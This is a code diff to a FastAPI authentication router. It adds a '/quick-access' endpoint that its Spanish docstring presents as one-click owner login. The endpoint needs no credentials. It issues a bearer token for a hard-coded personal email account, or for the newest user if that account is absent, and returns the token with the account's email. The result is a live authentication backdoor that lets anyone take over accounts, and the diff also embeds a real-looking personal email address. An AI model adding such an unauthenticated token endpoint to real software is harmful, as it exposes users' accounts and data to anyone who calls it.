@@ -87,6 +87,22 @@ async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: AsyncSessi
     token = create_access_token(user.id)
     return {"access_token": token, "token_type": "bearer"}
 
+@router.post("/quick-access")
+async def quick_access(db: AsyncSession = Depends(get_db)):
+    """Permite acceso directo en 1 clic para el propietario sin recordar claves ni correos."""
+    stmt = select(User).where(User.email == "lucianogutierrezagustin@gmail.com")
+    res = await db.execute(stmt)
+    user = res.scalars().first()
+    if not user:
+        stmt_all = select(User).order_by(User.id.desc())
+        res_all = await db.execute(stmt_all)
+        user = res_all.scalars().first()
+    if not user:
+        raise HTTPException(status_code=404, detail="No se encontró usuario.")
+    
+    token = create_access_token(user.id)
+    return {"access_token": token, "token_type": "bearer", "email": user.email}
+
 @router.get("/me", response_model=UserResponseSchema)
 async def get_me(user: User = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
     stmt_tg = select(TelegramSession).where(TelegramSession.user_id == user.id)
